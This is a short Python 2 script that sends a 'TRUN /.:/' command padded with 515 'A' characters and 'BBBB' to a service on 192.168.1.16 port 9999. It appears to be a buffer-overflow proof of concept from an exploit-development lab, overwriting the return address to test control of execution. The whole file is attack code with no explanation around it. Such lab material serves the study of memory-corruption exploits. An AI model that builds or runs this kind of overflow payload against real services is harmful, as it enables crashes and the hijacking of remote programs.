import socket

import sys

buff ="TRUN /.:/"

buff += "A" * 515 + "BBBB"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:

	s.connect(('192.168.1.16', 9999))

except:

	print "Error"

	sys.exit(0)

s.recv(1024)

s.send(buff)
